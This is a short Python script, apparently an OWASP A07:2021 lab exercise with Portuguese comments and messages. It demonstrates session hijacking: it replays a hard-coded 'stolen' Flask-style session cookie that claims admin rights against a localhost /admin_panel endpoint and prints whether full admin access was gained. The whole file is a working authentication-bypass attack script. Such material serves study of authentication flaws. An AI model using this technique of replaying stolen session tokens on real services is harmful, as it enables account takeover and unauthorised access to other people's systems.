#OWASP A07:2021 - Identification and Authentication Failures

import requests

cookie_roubado = "eyJpc19hZG1pbiI6MSwidXNlcm5hbWUiOiJhZG1pbiJ9.aDXckQ.lA8nQTDUxjQnAlyXvvPmvEAJCQU"

cookies = {
    "session": cookie_roubado
}

r = requests.get("http://localhost:5000/admin_panel", cookies=cookies)

if "Painel Administrativo" in r.text:
    print("[+] Acesso completo ao painel admin com sessão roubada!")
else:
    print("[-] Falhou. Cookie pode ter expirado ou já não é válido.")
